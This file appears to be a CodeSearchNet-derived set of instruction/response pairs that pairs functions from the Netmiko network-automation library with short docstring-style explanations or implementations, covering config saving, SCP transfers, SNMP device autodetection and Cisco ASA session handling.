{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef save_config(self, cmd=\"save config\", confirm=False, confirm_response=\"\"):\n        return super(ExtremeErsSSH, self).save_config(\n            cmd=cmd, confirm=confirm, confirm_response=confirm_response\n        )", "response": "Save config of the current user."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef special_login_handler(self, delay_factor=1):\n        delay_factor = self.select_delay_factor(delay_factor)\n        self.write_channel(self.RETURN)\n        time.sleep(1 * delay_factor)", "response": "This is a special login handler."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef save_config(\n        self,\n        cmd=\"copy running-config startup-config\",\n        confirm=True,\n        confirm_response=\"y\",\n    ):\n        \"\"\"Save Config for Extreme SLX.\"\"\"\n        return super(ExtremeSlxSSH, self).save_config(\n            cmd=cmd, confirm=confirm, confirm_response=confirm_response\n        )", "response": "Save Config for Extreme SLX."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef show_version(a_device):\n    remote_conn = ConnectHandler(**a_device)\n    print()\n    print(\"#\" * 80)\n    print(remote_conn.send_command_expect(\"show version\"))\n    print(\"#\" * 80)\n    print()", "response": "Execute show version command using Netmiko."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef main():\n    start_time = datetime.now()\n\n    for a_device in devices:\n        my_thread = threading.Thread(target=show_version, args=(a_device,))\n        my_thread.start()\n\n    main_thread = threading.currentThread()\n    for some_thread in threading.enumerate():\n        if some_thread != main_thread:\n            print(some_thread)\n            some_thread.join()\n\n    print(\"\\nElapsed time: \" + str(datetime.now() - start_time))", "response": "Execute show version on each of the devices."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nprepare the session after the connection has been established.", "response": "def session_preparation(self):\n        \"\"\"Prepare the session after the connection has been established.\"\"\"\n        # 0 will defer to the global delay factor\n        delay_factor = self.select_delay_factor(delay_factor=0)\n        self._test_channel_read()\n        self.set_base_prompt()\n        cmd = \"{}set cli mode -page OFF{}\".format(self.RETURN, self.RETURN)\n        self.disable_paging(command=cmd)\n        time.sleep(1 * delay_factor)\n        self.set_base_prompt()\n        time.sleep(0.3 * delay_factor)\n        self.clear_buffer()"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nstrips Done from command output", "response": "def strip_prompt(self, a_string):\n        \"\"\" Strip 'Done' from command output \"\"\"\n        output = super(NetscalerSSH, self).strip_prompt(a_string)\n        lines = output.split(self.RESPONSE_RETURN)\n        if \"Done\" in lines[-1]:\n            return self.RESPONSE_RETURN.join(lines[:-1])\n        else:\n            return output"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef establish_scp_conn(self):\n        ssh_connect_params = self.ssh_ctl_chan._connect_params_dict()\n        self.scp_conn = self.ssh_ctl_chan._build_ssh_client()\n        self.scp_conn.connect(**ssh_connect_params)\n        self.scp_client = scp.SCPClient(self.scp_conn.get_transport())", "response": "Establish the secure copy connection."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning the number of bytes available on remote device.", "response": "def remote_space_available(self, search_pattern=r\"(\\d+) \\w+ free\"):\n        \"\"\"Return space available on remote device.\"\"\"\n        remote_cmd = \"dir {}\".format(self.file_system)\n        remote_output = self.ssh_ctl_chan.send_command_expect(remote_cmd)\n        match = re.search(search_pattern, remote_output)\n        if \"kbytes\" in match.group(0) or \"Kbytes\" in match.group(0):\n            return int(match.group(1)) * 1000\n        return int(match.group(1))"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _remote_space_available_unix(self, search_pattern=\"\"):\n        self.ssh_ctl_chan._enter_shell()\n        remote_cmd = \"/bin/df -k {}\".format(self.file_system)\n        remote_output = self.ssh_ctl_chan.send_command(\n            remote_cmd, expect_string=r\"[\\$#]\"\n        )\n\n        # Try to ensure parsing is correct:\n        # Filesystem   1K-blocks  Used   Avail Capacity  Mounted on\n        # /dev/bo0s3f    1264808 16376 1147248     1%    /cf/var\n        remote_output = remote_output.strip()\n        output_lines = remote_output.splitlines()\n\n        # First line is the header; second is the actual file system info\n        header_line = output_lines[0]\n        filesystem_line = output_lines[1]\n\n        if \"Filesystem\" not in header_line or \"Avail\" not in header_line.split()[3]:\n            # Filesystem  1K-blocks  Used   Avail Capacity  Mounted on\n            msg = \"Parsing error, unexpected output from {}:\\n{}\".format(\n                remote_cmd, remote_output\n            )\n            raise ValueError(msg)\n\n        space_available = filesystem_line.split()[3]\n        if not re.search(r\"^\\d+$\", space_available):\n            msg = \"Parsing error, unexpected output from {}:\\n{}\".format(\n                remote_cmd, remote_output\n            )\n            raise ValueError(msg)\n\n        self.ssh_ctl_chan._return_cli()\n        return int(space_available) * 1024", "response": "Return space available on Unix system."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nverifying sufficient space is available on the destination file system ( return boolean.", "response": "def verify_space_available(self, search_pattern=r\"(\\d+) \\w+ free\"):\n        \"\"\"Verify sufficient space is available on destination file system (return boolean).\"\"\"\n        if self.direction == \"put\":\n            space_avail = self.remote_space_available(search_pattern=search_pattern)\n        elif self.direction == \"get\":\n            space_avail = self.local_space_available()\n        if space_avail > self.file_size:\n            return True\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _check_file_exists_unix(self, remote_cmd=\"\"):\n        if self.direction == \"put\":\n            self.ssh_ctl_chan._enter_shell()\n            remote_cmd = \"ls {}\".format(self.file_system)\n            remote_out = self.ssh_ctl_chan.send_command(\n                remote_cmd, expect_string=r\"[\\$#]\"\n            )\n            self.ssh_ctl_chan._return_cli()\n            return self.dest_file in remote_out\n        elif self.direction == \"get\":\n            return os.path.exists(self.dest_file)", "response": "Check if the dest_file already exists on the file system ( return boolean."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef remote_file_size(self, remote_cmd=\"\", remote_file=None):\n        if remote_file is None:\n            if self.direction == \"put\":\n                remote_file = self.dest_file\n            elif self.direction == \"get\":\n                remote_file = self.source_file\n        if not remote_cmd:\n            remote_cmd = \"dir {}/{}\".format(self.file_system, remote_file)\n        remote_out = self.ssh_ctl_chan.send_command(remote_cmd)\n        # Strip out \"Directory of flash:/filename line\n        remote_out = re.split(r\"Directory of .*\", remote_out)\n        remote_out = \"\".join(remote_out)\n        # Match line containing file name\n        escape_file_name = re.escape(remote_file)\n        pattern = r\".*({}).*\".format(escape_file_name)\n        match = re.search(pattern, remote_out)\n        if match:\n            line = match.group(0)\n            # Format will be 26  -rw-   6738  Jul 30 2016 19:49:50 -07:00  filename\n            file_size = line.split()[2]\n        if \"Error opening\" in remote_out or \"No such file or directory\" in remote_out:\n            raise IOError(\"Unable to find file on remote system\")\n        else:\n            return int(file_size)", "response": "Get the file size of the remote file."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _remote_file_size_unix(self, remote_cmd=\"\", remote_file=None):\n        if remote_file is None:\n            if self.direction == \"put\":\n                remote_file = self.dest_file\n            elif self.direction == \"get\":\n                remote_file = self.source_file\n        remote_file = \"{}/{}\".format(self.file_system, remote_file)\n        if not remote_cmd:\n            remote_cmd = \"ls -l {}\".format(remote_file)\n\n        self.ssh_ctl_chan._enter_shell()\n        remote_out = self.ssh_ctl_chan.send_command(remote_cmd, expect_string=r\"[\\$#]\")\n        self.ssh_ctl_chan._return_cli()\n\n        if \"No such file or directory\" in remote_out:\n            raise IOError(\"Unable to find file on remote system\")\n\n        escape_file_name = re.escape(remote_file)\n        pattern = r\"^.* ({}).*$\".format(escape_file_name)\n        match = re.search(pattern, remote_out, flags=re.M)\n        if match:\n            # Format: -rw-r--r--  1 pyclass  wheel  12 Nov  5 19:07 /var/tmp/test3.txt\n            line = match.group(0)\n            file_size = line.split()[4]\n            return int(file_size)\n\n        raise ValueError(\n            \"Search pattern not found for remote file size during SCP transfer.\"\n        )", "response": "Get the file size of the remote file on Unix system."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef file_md5(self, file_name):\n        with open(file_name, \"rb\") as f:\n            file_contents = f.read()\n            file_hash = hashlib.md5(file_contents).hexdigest()\n        return file_hash", "response": "Compute MD5 hash of file."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef process_md5(md5_output, pattern=r\"=\\s+(\\S+)\"):\n        match = re.search(pattern, md5_output)\n        if match:\n            return match.group(1)\n        else:\n            raise ValueError(\"Invalid output from MD5 command: {}\".format(md5_output))", "response": "Process the output of the MD5 command and return the MD5 hash of the current Cisco IOS entry."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef compare_md5(self):\n        if self.direction == \"put\":\n            remote_md5 = self.remote_md5()\n            return self.source_md5 == remote_md5\n        elif self.direction == \"get\":\n            local_md5 = self.file_md5(self.dest_file)\n            return self.source_md5 == local_md5", "response": "Compare md5 of file on network device to md5 of local file."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef put_file(self):\n        destination = \"{}/{}\".format(self.file_system, self.dest_file)\n        self.scp_conn.scp_transfer_file(self.source_file, destination)\n        # Must close the SCP connection to get the file written (flush)\n        self.scp_conn.close()", "response": "SCP copy the file from the local system to the remote device."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nenabling SCP on remote device.", "response": "def enable_scp(self, cmd=None):\n        \"\"\"\n        Enable SCP on remote device.\n\n        Defaults to Cisco IOS command\n        \"\"\"\n        if cmd is None:\n            cmd = [\"ip scp server enable\"]\n        elif not hasattr(cmd, \"__iter__\"):\n            cmd = [cmd]\n        self.ssh_ctl_chan.send_config_set(cmd)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ndisables SCP on remote device.", "response": "def disable_scp(self, cmd=None):\n        \"\"\"\n        Disable SCP on remote device.\n\n        Defaults to Cisco IOS command\n        \"\"\"\n        if cmd is None:\n            cmd = [\"no ip scp server enable\"]\n        elif not hasattr(cmd, \"__iter__\"):\n            cmd = [cmd]\n        self.ssh_ctl_chan.send_config_set(cmd)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncommitting the current configuration of the candidate.", "response": "def commit(\n        self,\n        force=False,\n        partial=False,\n        device_and_network=False,\n        policy_and_objects=False,\n        vsys=\"\",\n        no_vsys=False,\n        delay_factor=0.1,\n    ):\n        \"\"\"\n        Commit the candidate configuration.\n\n        Commit the entered configuration. Raise an error and return the failure\n        if the commit fails.\n\n        Automatically enters configuration mode\n\n        default:\n            command_string = commit\n        (device_and_network or policy_and_objects or vsys or\n                no_vsys) and not partial:\n            Exception\n        \"\"\"\n        delay_factor = self.select_delay_factor(delay_factor)\n\n        if (\n            device_and_network or policy_and_objects or vsys or no_vsys\n        ) and not partial:\n            raise ValueError(\n                \"'partial' must be True when using \"\n                \"device_and_network or policy_and_objects \"\n                \"or vsys or no_vsys.\"\n            )\n\n        # Select proper command string based on arguments provided\n        command_string = \"commit\"\n        commit_marker = \"configuration committed successfully\"\n        if force:\n            command_string += \" force\"\n        if partial:\n            command_string += \" partial\"\n            if vsys:\n                command_string += \" {0}\".format(vsys)\n            if device_and_network:\n                command_string += \" device-and-network\"\n            if policy_and_objects:\n                command_string += \" device-and-network\"\n            if no_vsys:\n                command_string += \" no-vsys\"\n            command_string += \" excluded\"\n\n        # Enter config mode (if necessary)\n        output = self.config_mode()\n        output += self.send_command_expect(\n            command_string,\n            strip_prompt=False,\n            strip_command=False,\n            expect_string=\"100%\",\n            delay_factor=delay_factor,\n        )\n\n        if commit_marker not in output.lower():\n            raise ValueError(\n                \"Commit failed with the following errors:\\n\\n{0}\".format(output)\n            )\n        return output"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nstrips command_string from output string.", "response": "def strip_command(self, command_string, output):\n        \"\"\"Strip command_string from output string.\"\"\"\n        output_list = output.split(command_string)\n        return self.RESPONSE_RETURN.join(output_list)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef strip_prompt(self, a_string):\n        response_list = a_string.split(self.RESPONSE_RETURN)\n        new_response_list = []\n        for line in response_list:\n            if self.base_prompt not in line:\n                new_response_list.append(line)\n\n        output = self.RESPONSE_RETURN.join(new_response_list)\n        return self.strip_context_items(output)", "response": "Strip the trailing router prompt from the output."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nstrips PaloAlto - specific output.", "response": "def strip_context_items(self, a_string):\n        \"\"\"Strip PaloAlto-specific output.\n\n        PaloAlto will also put a configuration context:\n        [edit]\n\n        This method removes those lines.\n        \"\"\"\n        strings_to_strip = [r\"\\[edit.*\\]\"]\n\n        response_list = a_string.split(self.RESPONSE_RETURN)\n        last_line = response_list[-1]\n\n        for pattern in strings_to_strip:\n            if re.search(pattern, last_line):\n                return self.RESPONSE_RETURN.join(response_list[:-1])\n\n        return a_string"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nsends a command to Palo Alto.", "response": "def send_command(self, *args, **kwargs):\n        \"\"\"Palo Alto requires an extra delay\"\"\"\n        kwargs[\"delay_factor\"] = kwargs.get(\"delay_factor\", 2.5)\n        return super(PaloAltoPanosBase, self).send_command(*args, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nsetting self. base_prompt to used as delimiter for stripping of trailing prompt in output.", "response": "def set_base_prompt(\n        self, pri_prompt_terminator=\":\", alt_prompt_terminator=\">\", delay_factor=2\n    ):\n        \"\"\"Sets self.base_prompt: used as delimiter for stripping of trailing prompt in output.\"\"\"\n        super(CoriantSSH, self).set_base_prompt(\n            pri_prompt_terminator=pri_prompt_terminator,\n            alt_prompt_terminator=alt_prompt_terminator,\n            delay_factor=delay_factor,\n        )\n        return self.base_prompt"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncheck if the device is in configuration mode or not.", "response": "def check_config_mode(self, check_string=\")#\", pattern=\"#\"):\n        \"\"\"\n        Checks if the device is in configuration mode or not.\n\n        Cisco IOS devices abbreviate the prompt at 20 chars in config mode\n        \"\"\"\n        return super(CiscoIosBase, self).check_config_mode(\n            check_string=check_string, pattern=pattern\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nsaving Config Using Copy Run Start", "response": "def save_config(self, cmd=\"write mem\", confirm=False, confirm_response=\"\"):\n        \"\"\"Saves Config Using Copy Run Start\"\"\"\n        return super(CiscoIosBase, self).save_config(\n            cmd=cmd, confirm=confirm, confirm_response=confirm_response\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _tcl_newline_rationalize(tcl_string):\n        NEWLINE = r\"\\n\"\n        CARRIAGE_RETURN = r\"\\r\"\n        tmp_string = re.sub(NEWLINE, CARRIAGE_RETURN, tcl_string)\n        if re.search(r\"[{}]\", tmp_string):\n            msg = \"Curly brace detected in string; TCL requires this be escaped.\"\n            raise ValueError(msg)\n        return tmp_string", "response": "Convert a TCL newline to a new TCL entry statement."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncompute MD5 hash of file.", "response": "def file_md5(self, file_name):\n        \"\"\"Compute MD5 hash of file.\"\"\"\n        file_contents = self._read_file(file_name)\n        file_contents = file_contents + \"\\n\"  # Cisco IOS automatically adds this\n        file_contents = file_contents.encode(\"UTF-8\")\n        return hashlib.md5(file_contents).hexdigest()"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef config_md5(self, source_config):\n        file_contents = source_config + \"\\n\"  # Cisco IOS automatically adds this\n        file_contents = file_contents.encode(\"UTF-8\")\n        return hashlib.md5(file_contents).hexdigest()", "response": "Compute MD5 hash of file contents."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef session_preparation(self):\n        delay_factor = self.select_delay_factor(delay_factor=0)\n        i = 1\n        while i <= 4:\n            # Comware can have a banner that prompts you to continue\n            # 'Press Y or ENTER to continue, N to exit.'\n            time.sleep(0.5 * delay_factor)\n            self.write_channel(\"\\n\")\n            i += 1\n\n        time.sleep(0.3 * delay_factor)\n        self.clear_buffer()\n        self._test_channel_read(pattern=r\"[>\\]]\")\n        self.set_base_prompt()\n        command = self.RETURN + \"screen-length disable\"\n        self.disable_paging(command=command)\n        # Clear the read buffer\n        time.sleep(0.3 * self.global_delay_factor)\n        self.clear_buffer()", "response": "Prepare the session after the connection has been established."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef set_base_prompt(\n        self, pri_prompt_terminator=\">\", alt_prompt_terminator=\"]\", delay_factor=1\n    ):\n        \"\"\"\n        Sets self.base_prompt\n\n        Used as delimiter for stripping of trailing prompt in output.\n\n        Should be set to something that is general and applies in multiple contexts. For Comware\n        this will be the router prompt with < > or [ ] stripped off.\n\n        This will be set on logging in, but not when entering system-view\n        \"\"\"\n        prompt = super(HPComwareBase, self).set_base_prompt(\n            pri_prompt_terminator=pri_prompt_terminator,\n            alt_prompt_terminator=alt_prompt_terminator,\n            delay_factor=delay_factor,\n        )\n\n        # Strip off leading character\n        prompt = prompt[1:]\n        prompt = prompt.strip()\n        self.base_prompt = prompt\n        return self.base_prompt", "response": "Sets self. base_prompt to the prompt that will be used for the router prompt."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nsends a SNMP GET operation using SNMPv3.", "response": "def _get_snmpv3(self, oid):\n        \"\"\"\n        Try to send an SNMP GET operation using SNMPv3 for the specified OID.\n\n        Parameters\n        ----------\n        oid : str\n            The SNMP OID that you want to get.\n\n        Returns\n        -------\n        string : str\n            The string as part of the value from the OID you are trying to retrieve.\n        \"\"\"\n        snmp_target = (self.hostname, self.snmp_port)\n        cmd_gen = cmdgen.CommandGenerator()\n\n        (error_detected, error_status, error_index, snmp_data) = cmd_gen.getCmd(\n            cmdgen.UsmUserData(\n                self.user,\n                self.auth_key,\n                self.encrypt_key,\n                authProtocol=self.auth_proto,\n                privProtocol=self.encryp_proto,\n            ),\n            cmdgen.UdpTransportTarget(snmp_target, timeout=1.5, retries=2),\n            oid,\n            lookupNames=True,\n            lookupValues=True,\n        )\n\n        if not error_detected and snmp_data[0][1]:\n            return text_type(snmp_data[0][1])\n        return \"\""}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nsends a SNMP GET operation using SNMPv2 to get the value of the specified OID.", "response": "def _get_snmpv2c(self, oid):\n        \"\"\"\n        Try to send an SNMP GET operation using SNMPv2 for the specified OID.\n\n        Parameters\n        ----------\n        oid : str\n            The SNMP OID that you want to get.\n\n        Returns\n        -------\n        string : str\n            The string as part of the value from the OID you are trying to retrieve.\n        \"\"\"\n        snmp_target = (self.hostname, self.snmp_port)\n        cmd_gen = cmdgen.CommandGenerator()\n\n        (error_detected, error_status, error_index, snmp_data) = cmd_gen.getCmd(\n            cmdgen.CommunityData(self.community),\n            cmdgen.UdpTransportTarget(snmp_target, timeout=1.5, retries=2),\n            oid,\n            lookupNames=True,\n            lookupValues=True,\n        )\n\n        if not error_detected and snmp_data[0][1]:\n            return text_type(snmp_data[0][1])\n        return \"\""}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _get_snmp(self, oid):\n        if self.snmp_version in [\"v1\", \"v2c\"]:\n            return self._get_snmpv2c(oid)\n        else:\n            return self._get_snmpv3(oid)", "response": "Wrapper for generic SNMP call."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ntries to guess the device type using SNMP GET based on the ConnectionClass dict.", "response": "def autodetect(self):\n        \"\"\"\n        Try to guess the device_type using SNMP GET based on the SNMP_MAPPER dict. The type which\n        is returned is directly matching the name in *netmiko.ssh_dispatcher.CLASS_MAPPER_BASE*\n        dict.\n\n        Thus you can use this name to retrieve automatically the right ConnectionClass\n\n        Returns\n        -------\n        potential_type : str\n            The name of the device_type that must be running.\n        \"\"\"\n        # Convert SNMP_MAPPER to a list and sort by priority\n        snmp_mapper_list = []\n        for k, v in SNMP_MAPPER.items():\n            snmp_mapper_list.append({k: v})\n        snmp_mapper_list = sorted(\n            snmp_mapper_list, key=lambda x: list(x.values())[0][\"priority\"]\n        )\n        snmp_mapper_list.reverse()\n\n        for entry in snmp_mapper_list:\n            for device_type, v in entry.items():\n                oid = v[\"oid\"]\n                regex = v[\"expr\"]\n\n            # Used cache data if we already queryied this OID\n            if self._response_cache.get(oid):\n                snmp_response = self._response_cache.get(oid)\n            else:\n                snmp_response = self._get_snmp(oid)\n                self._response_cache[oid] = snmp_response\n\n            # See if we had a match\n            if re.search(regex, snmp_response):\n                return device_type\n\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef enter_cli_mode(self):\n        delay_factor = self.select_delay_factor(delay_factor=0)\n        count = 0\n        cur_prompt = \"\"\n        while count < 50:\n            self.write_channel(self.RETURN)\n            time.sleep(0.1 * delay_factor)\n            cur_prompt = self.read_channel()\n            if re.search(r\"admin@\", cur_prompt) or re.search(\n                r\"^\\$$\", cur_prompt.strip()\n            ):\n                self.write_channel(\"cli\" + self.RETURN)\n                time.sleep(0.3 * delay_factor)\n                self.clear_buffer()\n                break\n            elif \">\" in cur_prompt or \"%\" in cur_prompt:\n                break\n            count += 1", "response": "Check if at shell prompt root@ and go into CLI."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef commit(\n        self,\n        confirm=False,\n        confirm_delay=None,\n        check=False,\n        comment=\"\",\n        and_quit=False,\n        delay_factor=1,\n    ):\n        \"\"\"\n        Commit the candidate configuration.\n\n        Commit the entered configuration. Raise an error and return the failure\n        if the commit fails.\n\n        Automatically enters configuration mode\n\n        default:\n            command_string = commit\n        check and (confirm or confirm_dely or comment):\n            Exception\n        confirm_delay and no confirm:\n            Exception\n        confirm:\n            confirm_delay option\n            comment option\n            command_string = commit confirmed or commit confirmed <confirm_delay>\n        check:\n            command_string = commit check\n\n        \"\"\"\n        delay_factor = self.select_delay_factor(delay_factor)\n\n        if check and (confirm or confirm_delay or comment):\n            raise ValueError(\"Invalid arguments supplied with commit check\")\n\n        if confirm_delay and not confirm:\n            raise ValueError(\n                \"Invalid arguments supplied to commit method both confirm and check\"\n            )\n\n        # Select proper command string based on arguments provided\n        command_string = \"commit\"\n        commit_marker = \"Commit complete.\"\n        if check:\n            command_string = \"commit check\"\n            commit_marker = \"Validation complete\"\n        elif confirm:\n            if confirm_delay:\n                command_string = \"commit confirmed \" + str(confirm_delay)\n            else:\n                command_string = \"commit confirmed\"\n            commit_marker = \"commit confirmed will be automatically rolled back in\"\n\n        # wrap the comment in quotes\n        if comment:\n            if '\"' in comment:\n                raise ValueError(\"Invalid comment contains double quote\")\n            comment = '\"{0}\"'.format(comment)\n            command_string += \" comment \" + comment\n\n        if and_quit:\n            command_string += \" and-quit\"\n\n        # Enter config mode (if necessary)\n        output = self.config_mode()\n        # and_quit will get out of config mode on commit\n        if and_quit:\n            prompt = self.base_prompt\n            output += self.send_command_expect(\n                command_string,\n                expect_string=prompt,\n                strip_prompt=True,\n                strip_command=True,\n                delay_factor=delay_factor,\n            )\n        else:\n            output += self.send_command_expect(\n                command_string,\n                strip_prompt=True,\n                strip_command=True,\n                delay_factor=delay_factor,\n            )\n\n        if commit_marker not in output:\n            raise ValueError(\n                \"Commit failed with the following errors:\\n\\n{0}\".format(output)\n            )\n\n        return output", "response": "Commit the candidate configuration."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nstrips the trailing router prompt from the output.", "response": "def strip_prompt(self, *args, **kwargs):\n        \"\"\"Strip the trailing router prompt from the output.\"\"\"\n        a_string = super(FlexvnfSSH, self).strip_prompt(*args, **kwargs)\n        return self.strip_context_items(a_string)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef enable(\n        self, cmd=\"enable\", pattern=r\"(ssword|User Name)\", re_flags=re.IGNORECASE\n    ):\n        \"\"\"Enter enable mode.\n        With RADIUS can prompt for User Name\n        SSH@Lab-ICX7250>en\n        User Name:service_netmiko\n        Password:\n        SSH@Lab-ICX7250#\n        \"\"\"\n        output = \"\"\n        if not self.check_enable_mode():\n            count = 4\n            i = 1\n            while i < count:\n                self.write_channel(self.normalize_cmd(cmd))\n                new_data = self.read_until_prompt_or_pattern(\n                    pattern=pattern, re_flags=re_flags\n                )\n                output += new_data\n                if \"User Name\" in new_data:\n                    self.write_channel(self.normalize_cmd(self.username))\n                    new_data = self.read_until_prompt_or_pattern(\n                        pattern=pattern, re_flags=re_flags\n                    )\n                    output += new_data\n                if \"ssword\" in new_data:\n                    self.write_channel(self.normalize_cmd(self.secret))\n                    output += self.read_until_prompt()\n                    return output\n                time.sleep(1)\n                i += 1\n\n        if not self.check_enable_mode():\n            msg = (\n                \"Failed to enter enable mode. Please ensure you pass \"\n                \"the 'secret' argument to ConnectHandler.\"\n            )\n            raise ValueError(msg)", "response": "Enter enable mode.\n        With RADIUS can prompt for User Name\n        SSH@Lab-ICX7250>en\n        User Name:service_netmiko\n        Password:\n        SSH@Lab-ICX7250#"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _process_option(self, tsocket, command, option):\n        if option == ECHO:\n            tsocket.sendall(IAC + DO + ECHO)\n        elif command in (DO, DONT):\n            tsocket.sendall(IAC + WONT + option)\n        elif command in (WILL, WONT):\n            tsocket.sendall(IAC + DONT + option)", "response": "Process the option from the server."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef show_version_queue(a_device, output_q):\n    output_dict = {}\n    remote_conn = ConnectHandler(**a_device)\n    hostname = remote_conn.base_prompt\n    output = (\"#\" * 80) + \"\\n\"\n    output += remote_conn.send_command(\"show version\") + \"\\n\"\n    output += (\"#\" * 80) + \"\\n\"\n    output_dict[hostname] = output\n    output_q.put(output_dict)", "response": "Use Netmiko to execute show version."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nexecute show version on each of the devices.", "response": "def main():\n    \"\"\"\n    Use processes and Netmiko to connect to each of the devices. Execute\n    'show version' on each device. Use a queue to pass the output back to the parent process.\n    Record the amount of time required to do this.\n    \"\"\"\n    start_time = datetime.now()\n    output_q = Queue(maxsize=20)\n\n    procs = []\n    for a_device in devices:\n        my_proc = Process(target=show_version_queue, args=(a_device, output_q))\n        my_proc.start()\n        procs.append(my_proc)\n\n    # Make sure all processes have finished\n    for a_proc in procs:\n        a_proc.join()\n\n    while not output_q.empty():\n        my_dict = output_q.get()\n        for k, val in my_dict.items():\n            print(k)\n            print(val)\n\n    print(\"\\nElapsed time: \" + str(datetime.now() - start_time))"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef session_preparation(self):\n        self._test_channel_read()\n        self.set_base_prompt()\n        if self.secret:\n            self.enable()\n        else:\n            self.asa_login()\n        self.disable_paging(command=\"terminal pager 0\")\n        if self.allow_auto_change:\n            try:\n                self.send_config_set(\"terminal width 511\")\n            except ValueError:\n                # Don't fail for the terminal width\n                pass\n\n        # Clear the read buffer\n        time.sleep(0.3 * self.global_delay_factor)\n        self.clear_buffer()", "response": "Prepare the session after the connection has been established."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef send_command_timing(self, *args, **kwargs):\n        output = super(CiscoAsaSSH, self).send_command_timing(*args, **kwargs)\n        if len(args) >= 1:\n            command_string = args[0]\n        else:\n            command_string = kwargs[\"command_string\"]\n        if \"changeto\" in command_string:\n            self.set_base_prompt()\n        return output", "response": "Send a command to the ASA."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nsending a command to the ASA server.", "response": "def send_command(self, *args, **kwargs):\n        \"\"\"\n        If the ASA is in multi-context mode, then the base_prompt needs to be\n        updated after each context change.\n        \"\"\"\n        if len(args) >= 1:\n            command_string = args[0]\n        else:\n            command_string = kwargs[\"command_string\"]\n\n        # If changeto in command, look for '#' to determine command is done\n        if \"changeto\" in command_string:\n            if len(args) <= 1:\n                expect_string = kwargs.get(\"expect_string\", \"#\")\n                kwargs[\"expect_string\"] = expect_string\n        output = super(CiscoAsaSSH, self).send_command(*args, **kwargs)\n\n        if \"changeto\" in command_string:\n            self.set_base_prompt()\n\n        return output"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nsetting the base prompt for the current ASA context.", "response": "def set_base_prompt(self, *args, **kwargs):\n        \"\"\"\n        Cisco ASA in multi-context mode needs to have the base prompt updated\n        (if you switch contexts i.e. 'changeto')\n\n        This switch of ASA contexts can occur in configuration mode. If this\n        happens the trailing '(config*' needs stripped off.\n        \"\"\"\n        cur_base_prompt = super(CiscoAsaSSH, self).set_base_prompt(*args, **kwargs)\n        match = re.search(r\"(.*)\\(conf.*\", cur_base_prompt)\n        if match:\n            # strip off (conf.* from base_prompt\n            self.base_prompt = match.group(1)\n            return self.base_prompt"}
